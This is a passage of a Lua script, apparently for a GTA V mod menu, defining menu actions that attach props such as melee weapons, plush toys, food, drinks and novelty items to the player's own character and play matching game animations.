    play_anim("amb@world_human_tennis_player@male@idle_a", "idle_b", -1)
end)

menu.action(melee_vroot, "Baseball Bat (Shoulder)", {""}, "", function(on_click)
    request_model_load(32653987)
    attachto(0.0, 0.05, -0.09, players.user(), 23.0, -161.0, -78.0, 32653987, 60309, false, false)
	play_animfreeze("anim@mp_player_intselfiewank", "idle_a", -1)
end)

menu.action(melee_vroot, "Baseball Bat (Swing)", {""}, "", function(on_click)
    request_model_load(32653987)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 32653987, 28422, false, false)
    play_anim("amb@world_human_tennis_player@male@idle_a", "idle_b", -1)
end)

menu.action(melee_vroot, "Bloody Machete (Hand)", {""}, "", function(on_click)
    request_model_load(3659774391)
    attachto(0.037, -0.06, -0.03, players.user(), 80.0, 0.0, -170.0, 3659774391, 6286, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Bloody Machete (Swing)", {""}, "", function(on_click)
    request_model_load(3659774391)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 3659774391, 28422, false, false)
    play_anim("amb@world_human_tennis_player@male@idle_a", "idle_c", -1)
end)

menu.action(melee_vroot, "Fire Axe (Back)", {""}, "", function(on_click)
    request_model_load(2133533553)
    attachto(-0.385, -0.16, 0.10, players.user(), -180.0, -70.0, 6.0, 2133533553, 24818, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Fire Axe (Hand)", {""}, "", function(on_click)
    request_model_load(2133533553)
    attachto(0.091, -0.450, -0.103, players.user(), -80.0, 0.0, 0.0, 2133533553, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Fire Axe (Swing)", {""}, "", function(on_click)
    request_model_load(2133533553)
    attachto(0.0, 0.0, 0.0, players.user(), 2.0, 6.0, -16.0, 2133533553, 28422, false, false)
    play_anim("amb@world_human_tennis_player@male@idle_a", "idle_c", -1)
end)

menu.action(melee_vroot, "Golf Club (Shoulder)", {""}, "", function(on_click)
    request_model_load(-580196246)
    attachto(0.07, 0.10, -0.04, players.user(), -115.0, 23.0, 13.0, -580196246, 57005, false, false)
    play_anim("weapons@first_person@aim_idle@generic@melee@small_wpn@nightstick@", "wall_block", -1)
end)

menu.action(melee_vroot, "Hedge Trimmer", {""}, "", function(on_click)
	play_anim("weapons@heavy@minigun", "fire_med", -1)
	request_model_load(1632396221)
    attachto(0.122, 0.032, 0.018, players.user(), -166.0, -17.0, 12.0, 1632396221, 28422, false, false)
end)

menu.action(melee_vroot, "Katana (Dual)", {""}, "", function(on_click)
    request_model_load(-491126417)
    attachto(0.35, -0.08, -0.12, players.user(), 0.0, -70.0, 6.0, -491126417, 24818, false, false)
	request_model_load(-491126417)
    attachto(0.35, -0.08, 0.13, players.user(), -180.0, 70.0, 6.0, -491126417, 24818, false, false)
end)

menu.action(melee_vroot, "Katana (Hand)", {""}, "", function(on_click)
    request_model_load(-491126417)
    attachto(0.08, 0.01, -0.02, players.user(), -80.0, 20.0, 10.0, -491126417, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Katana (Single)", {""}, "", function(on_click)
    request_model_load(-491126417)
    attachto(0.35, -0.08, -0.12, players.user(), 0.0, -70.0, 6.0, -491126417, 24818, false, false)
end)

menu.action(melee_vroot, "Katana (Swing)", {""}, "", function(on_click)
    request_model_load(-491126417)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 6.0, 0.0, -491126417, 28422, false, false)
    play_anim("amb@world_human_tennis_player@male@idle_a", "idle_b", -1)
end)

menu.action(melee_vroot, "Machete (Swing)", {""}, "", function(on_click)
    request_model_load(-2055486531)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -2055486531, 28422, false, false)
    play_anim("amb@world_human_tennis_player@male@idle_a", "idle_c", -1)
end)

menu.action(melee_vroot, "Pickaxe (Back)", {""}, "", function(on_click)
    request_model_load(260873931)
    attachto(-0.3, -0.16, 0.10, players.user(), -180.0, -70.0, 6.0, 260873931, 24818, false, false)
end)

menu.action(melee_vroot, "Pickaxe (Hand)", {""}, "", function(on_click)
    request_model_load(260873931)
    attachto(0.07, -0.33, 0.04, players.user(), -100.0, -7.0, -3.0, 260873931, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Pickaxe (Shoulder)", {""}, "", function(on_click)
    request_model_load(260873931)
    attachto(0.10, 0.02, 0.0, players.user(), 43.0, 117.0, 160.0, 260873931, 57005, false, false)
    play_anim("weapons@first_person@aim_idle@generic@melee@small_wpn@nightstick@", "wall_block", -1)
end)

menu.action(melee_vroot, "Shovel (Hand)", {""}, "", function(on_click)
    request_model_load(1462472410)
    attachto(0.09, 0.74, -0.03, players.user(), 90.0, 0.0, 0.0, 1462472410, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Sledgehammer (Back)", {""}, "", function(on_click)
    request_model_load(58886654)
    attachto(-0.385, -0.16, 0.10, players.user(), -180.0, -70.0, 6.0, 58886654, 24818, false, false)
end)

menu.action(melee_vroot, "Sledgehammer (Hand)", {""}, "", function(on_click)
    request_model_load(58886654)
    attachto(0.091, -0.435, -0.103, players.user(), -80.0, 0.0, 0.0, 58886654, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Sledgehammer (Swing)", {""}, "", function(on_click)
    request_model_load(58886654)
    attachto(0.0, 0.0, 0.0, players.user(), 5.0, 7.0, 0.0, 58886654, 28422, false, false)
    play_anim("amb@world_human_tennis_player@male@idle_a", "idle_a", -1)
end)

menu.action(melee_vroot, "Spanner (Hand)", {""}, "", function(on_click)
    request_model_load(2244391097)
    attachto(0.04, 0.01, 0.0, players.user(), -70.0, 10.0, 10.0, 2244391097, 28422, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Tennis Rack (Hand)", {""}, "", function(on_click)
    request_model_load(3209223907)
    attachto(0.04, 0.0, -0.01, players.user(), -70.0, 10.0, 20.0, 3209223907, 28422, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Tennis Rack (Swing)", {""}, "", function(on_click)
    request_model_load(3209223907)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 3209223907, 28422, false, false)
    play_anim("amb@world_human_tennis_player@male@idle_a", "idle_a", -1)
end)

----- PLUSHES & TOYS -----

menu.action(plushes_vroot, "Flamingo", {""}, "", function(on_click)
    request_model_load(3224907336)
    attachto(0.0, 0.12, -0.65, players.user(), 0.0, 0.0, 70.0, 3224907336, 58867, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Gnome", {""}, "", function(on_click)
    request_model_load(1301925404)
    attachto(0.0, 0.12, -0.25, players.user(), 0.0, 0.0, 40.0, 1301925404, 58867, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Impotent Rage", {""}, "", function(on_click)
    request_model_load(286149026)
    attachto(0.0, -0.02, 0.0, players.user(), 0.0, 0.0, 0.0, 286149026, 28422, false, false)
    play_anim("anim@scripted@freemode@postertag@graffiti_spray@male@", "shake_can_idle_male", -1)
end)

menu.action(plushes_vroot, "Kitty (Brown)", {""}, "", function(on_click)
    request_model_load(0x73D0A88E)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 0x73D0A88E, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Kitty (Cyan)", {""}, "", function(on_click)
    request_model_load(0x774CCEFA)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 0x774CCEFA, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Kitty (Green)", {""}, "", function(on_click)
    request_model_load(0x531607D9)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 0x531607D9, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Kitty (Purple)", {""}, "", function(on_click)
    request_model_load(0x30cdbf9d)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 0x30cdbf9d, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Kitty (Rasta)", {""}, "", function(on_click)
    request_model_load(0x61C98560)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 0x61C98560, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Kitty (Red)", {""}, "", function(on_click)
    request_model_load(0x39B7C3BD)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 0x39B7C3BD, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Pogo", {""}, "", function(on_click)
    request_model_load(1563886469)
    attachto(-0.01, -0.041, -0.041, players.user(), 0.0, 0.0, 20.0, 1563886469, 28422, false, false)
    play_anim("anim@scripted@freemode@postertag@graffiti_spray@male@", "shake_can_idle_male", -1)
end)

menu.action(plushes_vroot, "Princess Robo", {""}, "", function(on_click)
    request_model_load(0x9DA036B4)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 0x9DA036B4, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Rag Doll", {""}, "", function(on_click)
    request_model_load(3328693117)
    attachto(0.0, 0.0, 0.10, players.user(), 90.0, 0.0, 0.0, 3328693117, 28422, false, false)
    play_anim("anim@scripted@freemode@postertag@graffiti_spray@male@", "shake_can_idle_male", -1)
end)

menu.action(plushes_vroot, "Sensei", {""}, "", function(on_click)
    request_model_load(1467980301)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 1467980301, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Shiny Wasabi", {""}, "", function(on_click)
    request_model_load(0x5092ADD0)
    attachto(-0.08, 0.44, -0.02, players.user(), 0.0, -90.0, 170.0, 0x5092ADD0, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Skull (Black)", {""}, "", function(on_click)
    request_model_load(1925085104)
    attachto(0.03, -0.03, -0.03, players.user(), 10.0, 130.0, 100.0, 1925085104, 6286, false, false)
    play_anim("misscarsteal1leadinout@i_fought_the_law", "leadin_loop_devin", -1)
end)

menu.action(plushes_vroot, "Skull (Punk)", {""}, "", function(on_click)
    request_model_load(3186075562)
    attachto(0.03, -0.03, -0.03, players.user(), 10.0, 130.0, 100.0, 3186075562, 6286, false, false)
    play_anim("misscarsteal1leadinout@i_fought_the_law", "leadin_loop_devin", -1)
end)

menu.action(plushes_vroot, "Skull (Purple)", {""}, "", function(on_click)
    request_model_load(3326501215)
    attachto(0.03, 0.05, -0.085, players.user(), 10.0, 120.0, 110.0, 3326501215, 6286, false, false)
    play_anim("misscarsteal1leadinout@i_fought_the_law", "leadin_loop_devin", -1)
end)

menu.action(plushes_vroot, "Skull (White)", {""}, "", function(on_click)
    request_model_load(96246634)
    attachto(0.03, -0.03, -0.03, players.user(), 10.0, 130.0, 100.0, 96246634, 6286, false, false)
    play_anim("misscarsteal1leadinout@i_fought_the_law", "leadin_loop_devin", -1)
end)

menu.action(plushes_vroot, "Snowman", {""}, "", function(on_click)
    request_model_load(-1617412079)
    attachto(0.15, 0.12, -0.75, players.user(), 0.0, 0.0, -150.0, -1617412079, 58867, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(plushes_vroot, "Space Ranger", {""}, "", function(on_click)
    request_model_load(1035505466)
    attachto(0.0, -0.08, 0.0, players.user(), 0.0, 0.0, 0.0, 1035505466, 28422, false, false)
    play_anim("anim@scripted@freemode@postertag@graffiti_spray@male@", "shake_can_idle_male", -1)
end)

menu.action(plushes_vroot, "Teddy Bear", {""}, "", function(on_click)
    request_model_load(-1354005816)
    attachto(-0.20, 0.46, -0.016, players.user(), -180.0, -90.0, 0.0, -1354005816, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

----- FOOD & DRINK -----

menu.action(foodanddrinks_vroot, "Apple", {""}, "", function(on_click)
    request_model_load(2987815129)
    attachto(0.13, 0.05, 0.02, players.user(), -50.0, 16.0, 60.0, 2987815129, 18905, false, false)
    play_anim("mp_player_inteat@burger", "mp_player_int_eat_burger", -1)
end)

menu.action(foodanddrinks_vroot, "Bagel", {""}, "", function(on_click)
    request_model_load(3295383195)
    attachto(0.13, 0.05, 0.02, players.user(), -50.0, 16.0, 60.0, 3295383195, 18905, false, false)
    play_anim("mp_player_inteat@burger", "mp_player_int_eat_burger", -1)
end)

menu.action(foodanddrinks_vroot, "Beer", {""}, "", function(on_click)
    request_model_load(-1620762220)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -1620762220, 28422, false, false)
    play_anim("anim_heist@arcade_combined@", "ped_male@_stand_withdrink@_01b@_idles_idle_c", -1)
end)

menu.action(foodanddrinks_vroot, "Burger", {""}, "", function(on_click)
    request_model_load(-2054442544)
    attachto(0.13, 0.05, 0.02, players.user(), -50.0, 16.0, 60.0, -2054442544, 18905, false, false)
    play_anim("mp_player_inteat@burger", "mp_player_int_eat_burger", -1)
end)

menu.action(foodanddrinks_vroot, "Champagne", {""}, "", function(on_click)
    request_model_load(3691199637)
    attachto(-0.02, 0.0, -0.18, players.user(), 0.0, 0.0, 0.0, 3691199637, 28422, false, false)
    play_anim("anim_heist@arcade_combined@", "ped_male@_stand_withdrink@_01b@_idles_idle_c", -1)
end)

menu.action(foodanddrinks_vroot, "Cigar (Attach)", {""}, "attaches between the lips", function(on_click)
    request_model_load(3909405573)
    attachto(-0.018, 0.141, 0.009, players.user(), 0.0, -20.0, 100.0, 3909405573, 31086, false, false)
end)

menu.action(foodanddrinks_vroot, "Ciggy (Attach)", {""}, "attaches between the lips", function(on_click)
    request_model_load(3269700402)
    attachto(-0.013, 0.119, -0.01, players.user(), 20.0, -30.0, -60.0, 3269700402, 31086, false, false)
end)

menu.action(foodanddrinks_vroot, "Ciggy (Smoke)", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_AA_SMOKE", 0, true)
end)

menu.action(foodanddrinks_vroot, "Coffee", {""}, "", function(on_click)
    request_model_load(-598185919)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -598185919, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_c", -1)
end)

menu.action(foodanddrinks_vroot, "Cola", {""}, "", function(on_click)
    request_model_load(1020618269)
    attachto(0.001, 0.012, 0.010, players.user(), 0.0, 0.0, 120.0, 1020618269, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

menu.action(foodanddrinks_vroot, "Daiquiri", {""}, "", function(on_click)
    request_model_load(836865002)
    attachto(0.0, 0.0, -0.14, players.user(), 0.0, 0.0, 0.0, 836865002, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

menu.action(foodanddrinks_vroot, "Donut", {""}, "", function(on_click)
    request_model_load(-302942743)
    attachto(0.13, 0.05, 0.02, players.user(), -50.0, 16.0, 60.0, -302942743, 18905, false, false)
    play_anim("mp_player_inteat@burger", "mp_player_int_eat_burger", -1)
end)

menu.action(foodanddrinks_vroot, "Ego Bar", {""}, "", function(on_click)
    request_model_load(-447760697)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -447760697, 60309, false, false)
    play_anim("mp_player_inteat@burger", "mp_player_int_eat_burger", -1)
end)

menu.action(foodanddrinks_vroot, "Energy Drink", {""}, "", function(on_click)
    request_model_load(582043502)
    attachto(0.0, 0.0, 0.0, players.user(), -0.017, 0.0, 0.0, 582043502, 28422, false, false)
    play_anim("anim_heist@arcade_combined@", "ped_male@_stand_withdrink@_01b@_idles_idle_c", -1)
end)

menu.action(foodanddrinks_vroot, "Fruit Juice", {""}, "", function(on_click)
    request_model_load(-1016640704)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -1016640704, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

menu.action(foodanddrinks_vroot, "Hot Dog", {""}, "", function(on_click)
    request_model_load(2565741261)
    attachto(0.10, 0.0, 0.03, players.user(), 20.0, -90.0, -60.0, 2565741261, 18905, false, false)
    play_anim("mp_player_inteat@burger", "mp_player_int_eat_burger", -1)
end)

menu.action(foodanddrinks_vroot, "Mojito", {""}, "", function(on_click)
    request_model_load(1565560522)
    attachto(0.0, 0.0, -0.147, players.user(), 0.0, 0.0, -180.0, 1565560522, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

menu.action(foodanddrinks_vroot, "Performance Drink", {""}, "", function(on_click)
    request_model_load(746336278)
    attachto(0.0, 0.0, 0.0, players.user(), -0.017, 0.0, 0.0, 746336278, 28422, false, false)
    play_anim("anim_heist@arcade_combined@", "ped_male@_stand_withdrink@_01b@_idles_idle_c", -1)
end)

menu.action(foodanddrinks_vroot, "Popcorn", {""}, "", function(on_click)
    request_model_load(437729511)
    attachto(0.03, -0.01, -0.09, players.user(), 0.0, 0.0, -50.0, 437729511, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@base", "base", -1)
end)

menu.action(foodanddrinks_vroot, "Sandwich", {""}, "", function(on_click)
    request_model_load(-692093509)
    attachto(0.13, 0.05, 0.02, players.user(), -50.0, 16.0, 60.0, -692093509, 18905, false, false)
    play_anim("mp_player_inteat@burger", "mp_player_int_eat_burger", -1)
end)

menu.action(foodanddrinks_vroot, "Soda", {""}, "", function(on_click)
    request_model_load(-1321253704)
    attachto(0.01, -0.01, -0.10, players.user(), 0.0, 0.0, 0.0, -1321253704, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

menu.action(foodanddrinks_vroot, "Taco", {""}, "", function(on_click)
    request_model_load(1655278098)
    attachto(0.10, 0.0, 0.03, players.user(), 20.0, -90.0, -60.0, 1655278098, 18905, false, false)
    play_anim("mp_player_inteat@burger", "mp_player_int_eat_burger", -1)
end)

menu.action(foodanddrinks_vroot, "Tequila", {""}, "", function(on_click)
    request_model_load(1673852595)
    attachto(0.0, 0.0, -0.14, players.user(), 0.0, 0.0, 0.0, 1673852595, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

menu.action(foodanddrinks_vroot, "Tequila Sunrise", {""}, "", function(on_click)
    request_model_load(2662920690)
    attachto(0.0, 0.0, -0.147, players.user(), 0.0, 0.0, -180.0, 2662920690, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

menu.action(foodanddrinks_vroot, "Water", {""}, "", function(on_click)
    request_model_load(2006600278)
    attachto(0.0, 0.0, -0.08, players.user(), 0.0, 0.0, -90.0, 2006600278, 28422, false, false)
    play_anim("anim_heist@arcade_combined@", "ped_male@_stand_withdrink@_01b@_idles_idle_c", -1)
end)

menu.action(foodanddrinks_vroot, "Joint (Smoke)", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_SMOKING_POT", 0, true)
end)

menu.action(foodanddrinks_vroot, "Whisky Bottle", {""}, "", function(on_click)
    request_model_load(9531236)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 140.0, 9531236, 28422, false, false)
    play_anim("anim_heist@arcade_combined@", "ped_male@_stand_withdrink@_01b@_idles_idle_c", -1)
end)

menu.action(foodanddrinks_vroot, "Whisky Glass", {""}, "", function(on_click)
    request_model_load(-1863407086)
    attachto(0.01, -0.01, -0.06, players.user(), 0.0, 0.0, 0.0, -1863407086, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

menu.action(foodanddrinks_vroot, "Wine", {""}, "", function(on_click)
    request_model_load(-1296547421)
    attachto(0.01, -0.01, -0.11, players.user(), 0.0, 0.0, 0.0, -1296547421, 28422, false, false)
    play_anim("amb@world_human_drinking@coffee@male@idle_a", "idle_b", -1)
end)

----- UNCATEGORIZED PROPS -----

menu.action(scenarios_vroot, "Aim Rocket", {""}, "", function(on_click)
    request_model_load(737852268)
    attachto(0.12, 0.32, 1.56, players.user(), 0.0, 0.0, 0.0, 737852268, 60309, false, false)
	play_anim("weapons@heavy@rpg", "aim_med_loop", -1)
end)

menu.action(scenarios_vroot, "Air Surf", {""}, "", function(on_click)
    play_animstationary("swimming@scuba", "dive_glide", -1)
	request_model_load(3876094279)
    attachto(-0.11, 0.14, 0.0, players.user(), 0.0, -90.0, 100.0, 3876094279, 24817, false, false)
end)

menu.action(scenarios_vroot, "Banana Phone", {""}, "", function(on_click)
	play_animfreeze("amb@world_human_stand_mobile@male@standing@call@base", "base", -1)
	request_model_load(532565818)
    attachto(-0.005, -0.001, -0.04, players.user(), -71.0, -12.0, -110.0, 532565818, 28422, false, false)
end)

menu.action(scenarios_vroot, "Basket Ball", {""}, "", function(on_click)
    request_model_load(1840863642)
    attachto(-0.03, 0.01, 0.05, players.user(), 0.0, 0.0, -90.0, 1840863642, 60309, false, false)
	play_anim("anim@sports@ballgame@handball@", "ball_idle", -1)
end)

menu.action(scenarios_vroot, "Binoculars", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_BINOCULARS", 0, true)
end)

menu.action(foodanddrinks_vroot, "Bong", {""}, "", function(on_click)
    request_model_load(383196809)
    attachto(0.10, -0.25, 0.0, players.user(), 95.0, 190.0, 180.0, 383196809, 18905, false, false)
    request_model_load(-680040094)
    attachto(0.10, 0.00, 0.0, players.user(), 95.0, 190.0, 180.0, -680040094, 57005, false, false)
    play_anim("anim@safehouse@bong", "bong_stage3", -1)
end)

menu.action(scenarios_vroot, "Boom Box", {""}, "", function(on_click)
    request_model_load(1729911864)
    attachto(0.205, 0.0, -0.07, players.user(), -80.0, -10.0, 90.0, 1729911864, 6286, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(scenarios_vroot, "Booty Pic", {""}, "", function(on_click)
    request_model_load(2277310166)
    attachto(0.0, -0.0, 0.0, players.user(), 180.0, 180.0, 180.0, 2277310166, 28422, false, false)
    play_anim("mp_character_creation@customise@male_a", "loop", -1)
end)

menu.action(scenarios_vroot, "Bouquet", {""}, "", function(on_click)
    request_model_load(-1676901836)
    attachto(-0.29, 0.40, -0.02, players.user(), -90.0, -90.0, 0.0, -1676901836, 24817, false, false)
    play_anim("impexp_int-0", "mp_m_waremech_01_dual-0", -1)
end)

menu.action(scenarios_vroot, "Box", {""}, "", function(on_click)
    request_model_load(0x6af6741a)
    attachto(0.0, 0.0, -0.182, players.user(), 0.0, 0.0, 0.0, 0x6af6741a, 28422, false, false)
    play_anim("anim@heists@box_carry@", "idle", -1)
end)

menu.action(scenarios_vroot, "Browse Phone", {""}, "", function(on_click)
    request_model_load(-511116411)
    attachto(0.13, 0.04, -0.04, players.user(), 23.0, -78.0, -141.0, -511116411, 57005, false, false)
    play_anim("anim@amb@beach_party@stand@cell_phone@male_a@base", "base", -1)
end)

menu.action(scenarios_vroot, "Cameraman", {""}, "", function(on_click)
    request_model_load(-206866686)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 00.0, -206866686, 28422, false, false)
    play_anim("missfinale_c2mcs_1", "fin_c2_mcs_1_camman", -1)
end)

menu.action(scenarios_vroot, "Case (Diamonds)", {""}, "", function(on_click)
    request_model_load(450899411)
    attachto(0.0, -0.133, -0.187, players.user(), 10.0, 0.0, 0.0, 450899411, 28422, false, false)
    play_anim("anim@heists@box_carry@", "idle", -1)
end)

menu.action(scenarios_vroot, "Case (Drugs)", {""}, "", function(on_click)
    request_model_load(1049338225)
    attachto(0.0, -0.36, 0.12, players.user(), 10.0, 0.0, 0.0, 1049338225, 28422, false, false)
    play_anim("anim@heists@box_carry@", "idle", -1)
end)

menu.action(scenarios_vroot, "Case (Gold Figure)", {""}, "", function(on_click)
    request_model_load(4166900065)
    attachto(0.0, -0.24, -0.145, players.user(), 10.0, 0.0, 0.0, 4166900065, 28422, false, false)
    play_anim("anim@heists@box_carry@", "idle", -1)
end)

menu.action(scenarios_vroot, "Case (Gun)", {""}, "", function(on_click)
    request_model_load(2473382116)
    attachto(0.08, 0.02, -0.02, players.user(), -170.0, 0.0, 100.0, 2473382116, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(scenarios_vroot, "Case (Money)", {""}, "", function(on_click)
    request_model_load(-1787068858)
    attachto(-0.007, -0.15, -0.14, players.user(), 10.0, 0.0, 0.0, -1787068858, 28422, false, false)
    play_anim("anim@heists@box_carry@", "idle", -1)
end)

menu.action(scenarios_vroot, "Cash Offer", {""}, "", function(on_click)
    request_model_load(3999186071)
    attachto(0.11, 0.0, -0.02, players.user(), 102.0, 6.0, -8.0, 3999186071, 6286, false, false)
    play_anim("misscarsteal1leadinout@i_fought_the_law", "leadin_loop_devin", -1)
end)

menu.action(scenarios_vroot, "Check Map", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_TOURIST_MAP", 0, true)
end)

menu.action(scenarios_vroot, "Check Tablet", {""}, "", function(on_click)
    request_model_load(-1585232418)
    attachto(-0.05, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -1585232418, 28422, false, false)
    play_anim("amb@code_human_in_bus_passenger_idles@female@tablet@idle_a", "idle_a", -1)
end)

menu.action(scenarios_vroot, "Coin Toss", {""}, "", function(on_click)
    request_model_load(91219023)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 91219023, 28422, false, false)
    play_animplayonce("anim@mp_player_intcelebrationfemale@coin_roll_and_toss", "coin_roll_and_toss", -1)
end)

menu.action(scenarios_vroot, "Concrete Drilling", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_CONST_DRILL", 0, true)
end)

menu.action(scenarios_vroot, "Console Gamer", {""}, "", function(on_click)
    request_model_load(-1404244377)
    attachto(0.19, 0.05, -0.09, players.user(), 0.0, -56.0, -160.0, -1404244377, 57005, false, false)
    request_model_load(-409048857)
    attachto(0.07, 0.0, 0.0, players.user(), -170.0, -90.0, 0.0, -409048857, 31086, false, false)
    play_animstationary("missfam5mcs_4leadin", "family_5_mcs_4_loop_jimmy", -1)
end)

menu.action(scenarios_vroot, "Crutch Walk", {""}, "", function(on_click)
    request_model_load(3259882705)
    attachto(0.99, 0.0, -0.28, players.user(), 75.0, 0.0, -90.0, 3259882705, 57005, false, false)
    play_anim("move_characters@lester@waiting", "lester_waitidle_base", -1)
end)

menu.action(scenarios_vroot, "Dick Pic", {""}, "", function(on_click)
    request_model_load(2385350047)
    attachto(0.0, -0.0, 0.0, players.user(), 180.0, 180.0, 180.0, 2385350047, 28422, false, false)
    play_anim("mp_character_creation@customise@male_a", "loop", -1)
end)

menu.action(scenarios_vroot, "Farmer", {""}, "", function(on_click)
    request_model_load(-1855416667)
    attachto(0.0, -0.04, 0.0, players.user(), 0.0, 0.0, 0.0, -1855416667, 28422, false, false)
    play_anim("amb@world_human_janitor@male@idle_a", "idle_a", -1)
end)

menu.action(scenarios_vroot, "Fishing", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_STAND_FISHING", 0, true)
end)

menu.action(scenarios_vroot, "Flag Bearer", {""}, "", function(on_click)
    request_model_load(2808222752)
    attachto(-0.28, 0.16, -0.30, players.user(), -10.0, -40.0, -140.0, 2808222752, 24817, false, false)
	play_anim("weapons@melee_2h", "idle", -1)
end)

menu.action(scenarios_vroot, "Flaming Torso", {""}, "", function(on_click)
    request_model_load(3229200997)
    attachto(0.13, -0.18, 0.0, players.user(), 20.0, -90.0, 80.0, 3229200997, 24817, false, false)
end)

menu.action(scenarios_vroot, "Garbage Bag", {""}, "", function(on_click)
    request_model_load(-1998455445)
    attachto(0.01, 0.06, -0.03, players.user(), 0.0, 0.0, 0.0, -1998455445, 28422, false, false)
    play_anim("missfbi4prepp1", "idle", -1)
end)

menu.action(scenarios_vroot, "Gardener", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_GARDENER_PLANT", 0, true)
end)

menu.action(scenarios_vroot, "Gold Bar Offer", {""}, "", function(on_click)
    request_model_load(3784066701)
    attachto(0.091, 0.0, 0.0, players.user(), 0.0, 160.0, 90.0, 3784066701, 6286, false, false)
    play_anim("misscarsteal1leadinout@i_fought_the_law", "leadin_loop_devin", -1)
end)

menu.action(scenarios_vroot, "Hercules", {""}, "", function(on_click)
    request_model_load(390860802)
